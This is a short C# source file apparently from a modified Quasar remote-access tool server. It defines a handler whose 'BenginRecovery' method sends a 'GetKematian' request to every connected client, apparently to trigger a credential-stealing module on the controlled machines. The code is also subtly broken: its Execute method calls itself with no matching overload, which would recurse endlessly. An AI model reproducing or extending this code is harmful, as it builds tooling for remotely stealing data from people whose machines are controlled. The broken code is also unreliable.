using Quasar.Common.Messages;
using Quasar.Common.Messages.Monitoring.Kematian;
using Quasar.Common.Networking;
using Quasar.Server.Networking;
using System.Linq;

namespace Quasar.Server.Kematian
{
    public class KematianHandler : MessageProcessorBase<object>
    {
        private readonly Client[] _clients;

        public KematianHandler(Client[] clients) : base(true)
        {
            _clients = clients;
        }

        /// <inheritdoc />
        public override bool CanExecute(IMessage message) => message is GetKematian;

        /// <inheritdoc />
        public override bool CanExecuteFrom(ISender sender) => _clients.Any(c => c.Equals(sender));

        /// <inheritdoc />
        public override void Execute(ISender sender, IMessage message)
        {
            switch (message)
            {
                case GetKematian pass:
                    Execute(sender, pass);
                    break;
            }
        }

        public void BenginRecovery()
        {
            var req = new GetKematian();
            foreach (var client in _clients.Where(client => client != null))
            {
                client.Send(req);
            }

        }
    }
}
